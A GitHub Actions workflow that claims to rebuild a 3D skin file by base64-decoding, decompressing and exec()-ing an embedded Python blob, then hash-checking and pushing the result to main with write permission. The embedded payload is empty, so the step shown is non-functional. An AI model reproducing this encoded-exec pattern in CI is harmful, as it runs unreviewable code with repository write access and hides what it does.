name: Add AWP Skill
on:
  push:
    branches: [main]
    paths:
      - .github/workflows/add-awp-skill.yml
permissions:
  contents: write
jobs:
  add-skin:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.13'
      - name: Install generator dependencies
        run: python -m pip install 'numpy==2.3.5' 'trimesh==4.11.1'
      - name: Rebuild exact approved GLB
        run: |
          python - <<'PY'
          import base64, zlib
          payload = ''
          source = zlib.decompress(base64.b64decode(payload)).decode('utf-8')
          exec(compile(source, '<awp-skill>', 'exec'))
          PY
      - name: Verify exact file
        run: echo 'bc7d60037411409213a35329a2c90fd816bbfbeb066148ffb20dac8331f2dfb3  skins/awp_skill.glb' | sha256sum -c -
      - name: Commit to Game1
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add skins/awp_skill.glb
          git commit -m "Add AWP Skill skin"
          git push origin HEAD:main
